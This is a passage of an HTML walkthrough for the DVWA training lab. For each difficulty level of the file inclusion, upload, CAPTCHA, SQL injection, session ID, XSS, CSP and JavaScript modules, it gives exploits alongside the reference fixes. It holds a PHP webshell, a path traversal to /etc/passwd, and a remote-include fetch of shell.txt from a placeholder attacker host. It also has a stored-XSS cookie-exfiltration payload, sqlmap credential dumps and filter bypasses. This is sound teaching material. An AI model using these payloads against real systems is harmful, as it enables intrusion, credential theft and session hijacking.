+    <p>Source strips <code>"http://"</code>, <code>"https://"</code>, <code>"../"</code>, <code>"..\"</code> — once, non-recursively. Defeat with nesting or absolute paths:</p>
+    <pre>?page=....//....//....//etc/passwd        <span class="c"># "../" removed once → "../" remains</span>
+?page=/etc/passwd                          <span class="c"># absolute path, no ../ needed</span>
+?page=hthttp://tp://&lt;attacker&gt;/shell.txt    <span class="c"># nested scheme survives one strip</span></pre>
+    <p class="map">Lesson: single-pass <code>str_replace</code> is defeated by the "doubled token" trick — removing one instance from the middle reassembles the forbidden string.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> <code>fnmatch("file*")</code> allowlist <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Source requires the page to match <code>file*</code> (or be <code>include.php</code>). Traversal strings fail the match — but the <b>file://</b> wrapper satisfies <code>file*</code>:</p>
+    <pre>?page=file:///etc/passwd
+?page=file:///var/www/html/vulnerabilities/fi/source/high.php</pre>
+    <p class="map">Lesson: prefix allowlists (<code>file*</code>) collide with scheme names. <span class="pill p-warn">FACT: Likely</span> — confirm the <code>fnmatch</code> pattern in your source.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>impossible.php</code> allowlists the exact filenames (<code>include.php</code>, <code>file1.php</code>, <code>file2.php</code>, <code>file3.php</code>) and rejects everything else — a strict value allowlist, not pattern matching.</p>
+    <p><b>Fix to recommend:</b> never pass user input to <code>include</code>; map an opaque ID to a server-side filename allowlist; disable <code>allow_url_include</code>/<code>allow_url_fopen</code>. <span class="pill p-cwe">CWE-98</span> PHP Remote File Inclusion / <span class="pill p-cwe">CWE-22</span> Path Traversal. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 05 FILE UPLOAD ===================== -->
+<section class="mod" id="m5">
+  <h3><span class="mn">05 · File Upload</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A03/A05</span><span class="pill p-cwe">CWE-434</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>Upload lands in <code>hackable/uploads/</code>, web-reachable. Goal: upload a PHP webshell and browse to it. Pair with the File Inclusion module to execute non-<code>.php</code> payloads.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> no checks <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre><span class="c"># shell.php</span>
+&lt;?php system($_GET['c']); ?&gt;
+<span class="c"># then browse:</span>
+http://localhost:4280/hackable/uploads/shell.php?c=id</pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> on command output.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> checks MIME type &amp; size <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Source checks <code>$_FILES['type'] == 'image/jpeg'|'image/png'</code> — a client-supplied header. Intercept in Burp and change <code>Content-Type</code> to <code>image/jpeg</code> while keeping PHP content:</p>
+    <pre>Content-Type: image/jpeg     <span class="c"># spoofed; body is still &lt;?php system($_GET['c']);?&gt;</span></pre>
+    <p class="map">Lesson: the <code>Content-Type</code> in a multipart part is attacker-controlled. Never trust it. <span class="pill p-ok">EVIDENCE: VERIFIED</span> (well-documented DVWA path).</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> extension + <code>getimagesize()</code> <span class="stars">★★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Source checks the filename ends in <code>.jpg/.png/.jpeg</code> and that <code>getimagesize()</code> succeeds (real image dimensions). Make a <b>polyglot</b>: valid image header + PHP appended, named <code>.jpg</code>, then <b>execute it via the File Inclusion module</b> (which will <code>include()</code> any path):</p>
+    <pre>exiftool -Comment='&lt;?php system($_GET["c"]); ?&gt;' real.jpg -o shell.jpg
+<span class="c"># upload shell.jpg (passes getimagesize), then:</span>
+/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/shell.jpg&amp;c=id</pre>
+    <p class="map">Lesson: content checks (<code>getimagesize</code>) don't stop a polyglot; the kill is combining upload + an include sink. Cross-module chain — write it up as one finding.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>impossible.php</code> re-encodes the image with <code>imagecreatefromjpeg()</code>/<code>imagecreatefrompng()</code> (destroying any appended PHP), generates a random filename, uses the anti-CSRF token, and verifies the real type.</p>
+    <p><b>Fix to recommend:</b> store uploads outside the web root, random server-assigned names, re-encode/transcode media, serve from a non-executing path, validate real content type. <span class="pill p-cwe">CWE-434</span> Unrestricted Upload of File with Dangerous Type. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 06 INSECURE CAPTCHA ===================== -->
+<section class="mod" id="m6">
+  <h3><span class="mn">06 · Insecure CAPTCHA</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A04:2021 Insecure Design / A07</span><span class="pill p-cwe">CWE-287</span><span class="pill p-cwe">CWE-841</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>A two-step "change password with reCAPTCHA" flow. The bug is <b>flawed multi-step logic</b>, not the CAPTCHA crypto. Needs reCAPTCHA keys configured to render, but the logic flaw is the lesson.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> trust a client "step" flag <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Step 1 validates the CAPTCHA and shows a confirm form; step 2 changes the password. The server decides which step you're on from a <b>hidden/POST parameter</b> (<code>step=2</code>) and/or <code>passed_captcha</code>, so you skip the CAPTCHA by POSTing step 2 directly:</p>
+    <pre>POST /vulnerabilities/captcha/
+password_new=pwn&amp;password_conf=pwn&amp;step=2&amp;Change=Change    <span class="c"># no CAPTCHA solved</span></pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> when the password changes without a CAPTCHA.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> hidden <code>passed_captcha</code> flag <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Source now sets a hidden field <code>passed_captcha=true</code> after step 1 and trusts it on step 2. Set it yourself:</p>
+    <pre>POST ... password_new=pwn&amp;password_conf=pwn&amp;step=2&amp;passed_captcha=true&amp;Change=Change</pre>
+    <p class="map">Lesson: never trust a client-echoed "I already passed the check" flag. State belongs server-side.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> hardcoded backdoor in the validator <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>High merges both steps and really calls <code>recaptcha_check_answer()</code> — but the source leaves a <b>developer backdoor</b> (an actual <code>DEV NOTE</code> in the HTML). The check is:</p>
+    <pre>if ( $resp ||
+     ( $_POST['g-recaptcha-response'] == 'hidd3n_valu3'
+       &amp;&amp; $_SERVER['HTTP_USER_AGENT'] == 'reCAPTCHA' ) ) { ... }</pre>
+    <p>So satisfy the backdoor branch — in Burp, set the POST param and the User-Agent header:</p>
+    <pre>POST /vulnerabilities/captcha/
+User-Agent: reCAPTCHA
+...&amp;g-recaptcha-response=hidd3n_valu3&amp;password_new=pwn&amp;password_conf=pwn&amp;step=1&amp;Change=Change</pre>
+    <p class="map"><span class="pill p-ok">EVIDENCE: VERIFIED</span> · <span class="pill p-ok">FACT: Verified</span> (the <code>hidd3n_valu3</code> + <code>User-Agent: reCAPTCHA</code> backdoor is in <code>high.php</code>). Lesson: debug/dev backdoors shipped to prod are a live finding class — grep code for magic constants and header checks.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>impossible.php</code> verifies the CAPTCHA server-side on the <em>same</em> request that performs the change, requires the current password, uses the anti-CSRF token and PDO, and never trusts a client step/passed flag.</p>
+    <p><b>Fix to recommend:</b> keep all multi-step state server-side (session), re-verify every gate on the action request, require re-auth. <span class="pill p-cwe">CWE-841</span> Improper Enforcement of Behavioral Workflow. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 07 SQLi ===================== -->
+<section class="mod" id="m7">
+  <h3><span class="mn">07 · SQL Injection</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A03:2021 Injection</span><span class="pill p-cwe">CWE-89</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>"User ID" box → <code>SELECT first_name, last_name FROM users WHERE user_id = '$id'</code>. Two columns returned → UNION has 2 columns.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> string concat, in-band <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre>1' OR '1'='1              <span class="c"># dump all rows</span>
+' UNION SELECT user, password FROM users-- -     <span class="c"># creds (MD5 hashes)</span>
+' UNION SELECT @@version, database()-- -
+' UNION SELECT table_name, 2 FROM information_schema.tables-- -</pre>
+    <p>Crack the MD5s (<code>5f4dcc3b5aa765d61d8327deb882cf99</code> = <code>password</code>). Or just automate:</p>
+    <pre>sqlmap -u "http://localhost:4280/vulnerabilities/sqli/?id=1&amp;Submit=Submit" \
+  --cookie="PHPSESSID=$SID; security=low" --batch --dump -T users</pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> on hash dump.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> dropdown + <code>mysqli_real_escape_string</code>, numeric <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Input comes from a POST dropdown and is escaped, but it's used <b>numerically</b> (no quotes in the query): <code>WHERE user_id = $id</code>. Escaping doesn't help an unquoted integer context — inject directly (via Burp, since the UI is a dropdown):</p>
+    <pre>id=1 UNION SELECT user, password FROM users-- -
+id=1 OR 1=1</pre>
+    <p class="map">Lesson: <code>mysqli_real_escape_string</code> only protects <em>quoted string</em> contexts. An unquoted numeric parameter is wide open despite escaping. Classic false sense of security.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> separate-page input + <code>LIMIT 1</code> <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>The ID is set via a separate window/session var to defeat trivial automation, and the query appends <code>LIMIT 1</code>. Comment out the limit:</p>
+    <pre>' UNION SELECT user, password FROM users-- -
+<span class="c"># the trailing LIMIT 1 is neutralised by the -- - comment</span></pre>
+    <p class="map">Lesson: moving input to another request only raises automation friction; the injection class is identical. Point sqlmap at the input page with <code>--second-order</code> if needed.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>impossible.php</code> uses <b>PDO prepared statements</b> with a bound parameter, checks the input <code>is_numeric</code>, uses the anti-CSRF token, and returns exactly one row. Parameterisation removes the injection entirely regardless of input.</p>
+    <p><b>Fix to recommend:</b> parameterised queries / ORM bind params everywhere; never concatenate. <span class="pill p-cwe">CWE-89</span>. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 08 BLIND SQLi ===================== -->
+<section class="mod" id="m8">
+  <h3><span class="mn">08 · SQL Injection (Blind)</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A03:2021 Injection</span><span class="pill p-cwe">CWE-89</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>Same query, but the app returns only "User ID exists / missing" — no data. Infer bit-by-bit via boolean and time.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> boolean &amp; time-based <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre><span class="c"># Boolean</span>
+1' AND '1'='1-- -          <span class="c"># "exists"</span>
+1' AND '1'='2-- -          <span class="c"># "missing"  → oracle confirmed</span>
+<span class="c"># Extract: is first char of db version '5'?</span>
+1' AND SUBSTRING(@@version,1,1)='5'-- -
+<span class="c"># Time-based (no visible difference needed)</span>
+1' AND IF(SUBSTRING(database(),1,1)='d',SLEEP(3),0)-- -</pre>
+    <pre>sqlmap -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit" \
+  --cookie="PHPSESSID=$SID; security=low" --technique=BT --batch --dump -T users</pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> on extracted creds.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> dropdown + escaping, numeric context <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>As with Module 07 Medium: POST, escaped, numeric context — inject without quotes:</p>
+    <pre>id=1 AND IF(SUBSTRING(user(),1,1)='r',SLEEP(3),0)</pre>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> cookie/second-page input + LIMIT <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Input moved to a separate request; payloads unchanged, terminate with <code>-- -</code> to drop <code>LIMIT</code>. Feed sqlmap the right request with the <code>security=high</code> cookie and the second-order input page.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>PDO prepared statement + <code>is_numeric</code> + anti-CSRF token — identical defence to in-band SQLi. Blindness is a property of the <em>response</em>, not the fix; parameterisation kills both. <span class="pill p-cwe">CWE-89</span>. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 09 WEAK SESSION IDS ===================== -->
+<section class="mod" id="m9">
+  <h3><span class="mn">09 · Weak Session IDs</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A07:2021 Identification &amp; Auth Failures</span><span class="pill p-cwe">CWE-330</span><span class="pill p-cwe">CWE-384</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>A "Generate" button issues a <code>dvwaSession</code> cookie. Analyse its predictability across levels. Capture several in Burp Sequencer or just by clicking + reading <code>Set-Cookie</code>.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> sequential integer <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>dvwaSession = 1, 2, 3 …</code> — a simple incrementing counter. Trivially predictable → session hijack by guessing the next value.</p>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> by observing monotonic increments.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> <code>time()</code> <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>The ID is the current Unix timestamp. Low entropy and externally knowable — predict/bracket it from the response <code>Date:</code> header and brute a small window.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> <code>md5(sequential)</code> <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>The ID is <code>md5()</code> of an incrementing integer. Looks random, isn't: hash small integers until one matches an observed cookie, then predict the next.</p>
+    <pre>for i in $(seq 1 100000); do echo -n $i | md5sum; done | grep &lt;observed-md5&gt;</pre>
+    <p class="map">Lesson: hashing a predictable seed yields a predictable output. Entropy must come from a CSPRNG, not from obfuscating a counter.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>impossible.php</code> uses a cryptographically strong random value (and secure cookie flags). Unpredictable, so no hijack by guessing.</p>
+    <p><b>Fix to recommend:</b> framework-managed session IDs from a CSPRNG, <code>HttpOnly</code>+<code>Secure</code>+<code>SameSite</code>, rotate on privilege change. <span class="pill p-cwe">CWE-330</span> Use of Insufficiently Random Values. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 10 DOM XSS ===================== -->
+<section class="mod" id="m10">
+  <h3><span class="mn">10 · XSS (DOM)</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A03:2021 Injection</span><span class="pill p-cwe">CWE-79</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>A language dropdown writes <code>?default=</code> into the DOM client-side (no server round-trip for the sink). Payload lives in the fragment/query and is parsed by JS.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> raw <code>document.write</code> sink <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre>?default=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> on alert. Sink is client-side JS writing <code>default</code> straight into the page.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> server strips <code>&lt;script&gt;</code> <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>A crude filter removes <code>&lt;script&gt;</code>. Break out of the option/select context instead of using a script tag:</p>
+    <pre>?default=&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;</pre>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> allowlist of languages <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Server only echoes known languages — but the sink is in the <b>fragment</b> (<code>#</code>), which never reaches the server. Put the payload after <code>#</code> so only client JS sees it:</p>
+    <pre>?default=English#&lt;img src=x onerror=alert(1)&gt;
+<span class="c"># or:  /vulnerabilities/xss_d/?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</span></pre>
+    <p class="map">Lesson: DOM XSS lives in the client. Server-side allowlisting can't fix a sink fed by <code>location.hash</code>.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>impossible.php</code> / its JS drops the untrusted default entirely (or hard-codes the switch), so nothing attacker-controlled reaches the sink.</p>
+    <p><b>Fix to recommend:</b> use safe DOM APIs (<code>textContent</code>, not <code>innerHTML</code>/<code>document.write</code>), validate against an allowlist client-side, encode for the sink context. <span class="pill p-cwe">CWE-79</span>. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 11 REFLECTED XSS ===================== -->
+<section class="mod" id="m11">
+  <h3><span class="mn">11 · XSS (Reflected)</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A03:2021 Injection</span><span class="pill p-cwe">CWE-79</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>A "name" box is reflected into the response unescaped.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> raw reflection <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre>?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> on alert / cookie exfil to your listener.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> <code>str_replace('&lt;script&gt;','')</code> <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre>&lt;ScRiPt&gt;alert(1)&lt;/ScRiPt&gt;       <span class="c"># case bypass</span>
+&lt;img src=x onerror=alert(1)&gt;      <span class="c"># no script tag at all</span>
+&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt; <span class="c"># nested; one strip reassembles</span></pre>
+    <p class="map">Lesson: removing one literal case-sensitively is defeated by case-mixing, alternate tags, or nesting.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> regex strips script variants <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>A case-insensitive regex kills <code>&lt;script&gt;</code> forms, but not event handlers / other tags:</p>
+    <pre>&lt;img src=x onerror=alert(document.cookie)&gt;
+&lt;svg/onload=alert(1)&gt;
+&lt;body onpageshow=alert(1)&gt;</pre>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>impossible.php</code> applies <code>htmlspecialchars()</code> on output — context-correct encoding neutralises every tag/handler.</p>
+    <p><b>Fix to recommend:</b> output-encode per context (<code>htmlspecialchars</code> for HTML body, attribute/JS/URL encoders elsewhere) + CSP as defence-in-depth. <span class="pill p-cwe">CWE-79</span>. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 12 STORED XSS ===================== -->
+<section class="mod" id="m12">
+  <h3><span class="mn">12 · XSS (Stored)</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A03:2021 Injection</span><span class="pill p-cwe">CWE-79</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>Guestbook (name + message) persisted to DB and shown to every visitor → persistent, higher impact. Watch the <code>maxlength</code> on the message box (client-side only — strip it in Burp/DevTools).</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> raw store &amp; render <span class="stars">★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre>message = &lt;script&gt;new Image().src='http://&lt;you&gt;/c?'+document.cookie&lt;/script&gt;
+<span class="c"># name field has a short maxlength; remove it client-side or inject via the name too</span></pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> — payload fires for anyone loading the guestbook (incl. admin). This is the one to screenshot for "session theft" impact.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> name escaped, message weakly filtered <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Message runs through a <code>str_replace</code> of <code>&lt;script&gt;</code> (bypass as in Reflected Medium); the <b>name</b> field only applies <code>htmlspecialchars</code> inconsistently, so inject via the field with the weaker control:</p>
+    <pre>&lt;img src=x onerror=alert(1)&gt;        <span class="c"># in the message</span>
+<span class="c"># or move the payload into the name field via Burp if message is tighter</span></pre>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> regex on script, handlers survive <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <pre>&lt;img src=x onerror=alert(document.cookie)&gt;
+&lt;svg onload=alert(1)&gt;</pre>
+    <p class="map">Same lesson as Reflected High — tag/handler vectors beat script-only filtering.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p><code>impossible.php</code> applies <code>htmlspecialchars()</code> + <code>trim</code> on both fields (and PDO for storage). Encode-on-output is the fix; stored vs reflected changes impact, not remediation.</p>
+    <p><b>Fix:</b> encode on output for the render context; consider sanitising on input as defence-in-depth; CSP. <span class="pill p-cwe">CWE-79</span>. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 13 CSP BYPASS ===================== -->
+<section class="mod" id="m13">
+  <h3><span class="mn">13 · Content Security Policy (CSP) Bypass</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A05:2021 Security Misconfiguration</span><span class="pill p-cwe">CWE-693</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>Teaches that a <b>misconfigured</b> CSP gives false assurance. Each level ships a different policy; you read the <code>Content-Security-Policy</code> header and find the weakness.</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> allowlists an external host you control <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Low allowlists specific external script sources (historically Pastebin; the 2.x build moved the low-level source to <b>Hastebin</b> because Pastebin added <code>nosniff</code> — <span class="pill p-ok">FACT: Verified</span> from release notes). Host your JS on the allowlisted provider and include it:</p>
+    <pre>&lt;script src="https://&lt;allowlisted-host&gt;/raw/&lt;your-id&gt;"&gt;&lt;/script&gt;</pre>
+    <p class="map">Lesson: allowlisting a host that serves arbitrary user content (paste sites, CDNs with open uploads) is equivalent to <code>unsafe-inline</code>.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> <code>nonce</code> that's static/guessable <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Medium uses a CSP <code>nonce</code> — but it's a fixed, hardcoded value visible in the policy. Reuse it:</p>
+    <pre>&lt;script nonce="&lt;the-static-nonce&gt;"&gt;alert(1)&lt;/script&gt;</pre>
+    <p class="map">Lesson: a nonce must be unpredictable and per-response. A constant nonce is no nonce.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> <code>script-src 'self'</code> + a JSONP-ish endpoint <span class="stars">★★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>High locks scripts to <code>'self'</code>, but the app serves a same-origin endpoint that reflects a callback (<code>source/jsonp.php?callback=…</code>). Abuse it to run code from <code>'self'</code>:</p>
+    <pre>&lt;script src="/vulnerabilities/csp/source/jsonp.php?callback=alert(1)//"&gt;&lt;/script&gt;</pre>
+    <p class="map"><span class="pill p-warn">FACT: Likely</span> — confirm the exact callback endpoint/param in your source. Lesson: <code>'self'</code> is only as safe as every script-serving endpoint on the origin (JSONP, user uploads, open redirects to JS).</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Impossible ships a tight policy (no <code>unsafe-inline</code>, no wildcard hosts, per-request nonces, no exploitable same-origin JS endpoint).</p>
+    <p><b>Fix:</b> strict CSP with per-response nonces/hashes, no <code>unsafe-inline/eval</code>, no untrusted allowlisted hosts, and treat CSP as defence-in-depth <em>behind</em> output encoding, not instead of it. <span class="pill p-cwe">CWE-693</span> Protection Mechanism Failure. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 14 JAVASCRIPT ===================== -->
+<section class="mod" id="m14">
+  <h3><span class="mn">14 · JavaScript Attacks</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A04:2021 Insecure Design</span><span class="pill p-cwe">CWE-602</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
+  <p>Submit the word the page asks for, but it's gated by a client-side JS routine that computes a token from your input. Lesson: <b>client-side logic is never a trust boundary.</b> Read the JS, replicate the token, or just call the function.</p>
+
+  <p class="map">Objective at every level: submit the phrase <code>success</code> with a <code>token</code> the server accepts. The phrase is always <code>success</code>; only how the token is derived changes. <span class="pill p-ok">FACT: Verified</span> (from module source).</p>
+
+  <details><summary><span class="lv lv-low">LOW</span> token = <code>md5(str_rot13("success"))</code> <span class="stars">★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Inline JS: <code>generate_token()</code> sets <code>token = md5(rot13(phrase))</code>. The literal token for <code>success</code> is <code>38581812b435834ebf84ebcc2c6424d6</code>. Easiest: console.</p>
+    <pre><span class="c"># DevTools console on the page:</span>
+document.getElementById('phrase').value='success';
+generate_token();                 <span class="c"># fills the hidden token</span>
+<span class="c"># then click Submit. Or POST directly:</span>
+<span class="c"># phrase=success&amp;token=38581812b435834ebf84ebcc2c6424d6&amp;send=Submit</span></pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> · <span class="pill p-ok">FACT: Verified</span> (token literal confirmed from source).</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-med">MEDIUM</span> token = <code>strrev("XXsuccessXX")</code>, JS in a minified file <span class="stars">★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>The JS is broken into a separate, minified file. The server checks <code>token == strrev("XXsuccessXX")</code> → the literal is <code>XXsseccusXX</code>. So:</p>
+    <pre><span class="c"># phrase=success&amp;token=XXsseccusXX&amp;send=Submit</span>
+<span class="c"># or beautify the JS file, set a breakpoint on submit, read the computed token.</span></pre>
+    <p><span class="pill p-ok">EVIDENCE: VERIFIED</span> · <span class="pill p-ok">FACT: Verified</span> (<code>strrev("XXsuccessXX")</code> from source).</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-high">HIGH</span> packed/obfuscated JS <span class="stars">★★★★</span><span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Token logic is packed (<code>eval(function(p,a,c,k,e,d){…})</code>). Don't reverse it by hand — let the browser do the work: beautify the script, set a breakpoint where the form submits, type <code>success</code>, step until the token field is populated, and read it; then submit that value. (The high routine also tweaks the token after a short delay, so read it at submit time, not on load.)</p>
+    <pre><span class="c"># Sources ▸ beautify {} ▸ breakpoint on the submit handler ▸ step ▸ read #token</span></pre>
+    <p class="map"><span class="pill p-ok">EVIDENCE: VERIFIED</span> (method) · <span class="pill p-warn">FACT: Likely</span> (exact packed routine varies). Lesson: obfuscation raises reverse-engineering cost, not security — anything the browser computes, you can read at runtime.</p>
+  </div></details>
+
+  <details><summary><span class="lv lv-imp">IMPOSSIBLE</span> the reference fix <span class="sp">reveal</span></summary>
+  <div class="inner">
+    <p>Impossible performs the check <b>server-side</b> (the token is validated on the backend against a server secret / HMAC), so client tampering can't forge it.</p>
+    <p><b>Fix:</b> never rely on client-side validation for security decisions; enforce on the server, sign with a server-only key. <span class="pill p-cwe">CWE-602</span> Client-Side Enforcement of Server-Side Security. <span class="pill p-warn">FACT: Likely</span></p>
+  </div></details>
+</section>
+
+<!-- ===================== 15 AUTHORISATION BYPASS ===================== -->
+<section class="mod" id="m15">
+  <h3><span class="mn">15 · Authorisation Bypass</span></h3>
+  <div class="meta"><span class="pill p-info">OWASP A01:2021 Broken Access Control</span><span class="pill p-cwe">CWE-285</span><span class="pill p-cwe">CWE-639</span><span class="pill p-warn">FACT: Likely (mappings)</span></div>
